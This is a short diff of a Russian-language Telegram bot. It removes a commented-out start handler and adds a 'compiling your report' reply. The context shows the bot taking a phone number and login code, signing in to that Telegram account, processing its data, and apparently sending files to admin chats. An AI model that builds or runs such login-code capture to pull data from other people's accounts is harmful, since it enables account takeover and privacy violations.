@@ -61,13 +61,6 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
 async def unauthorized(message: types.Message):
     await message.reply("Извините, вы не авторизованы для использования этого бота.")
 
-#@dp.message_handler(commands=['start'])
-#async def send_welcome(message: types.Message):
-#    if message.from_user.id in allowed_users:
-#        await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
-#    else:
-#        await unauthorized(message)
-
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
     user_id = message.from_user.id
@@ -127,6 +120,7 @@ async def get_code(message: types.Message):
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         
         await message.reply("Успешная авторизация!")
+        await message.reply("Работаю, командир. Подожди, пока я сформирую отчет и пришлю его тебе")
         await process_user_data(client, phone_number, message.from_user.id)
         await client.log_out()
         await client.disconnect()
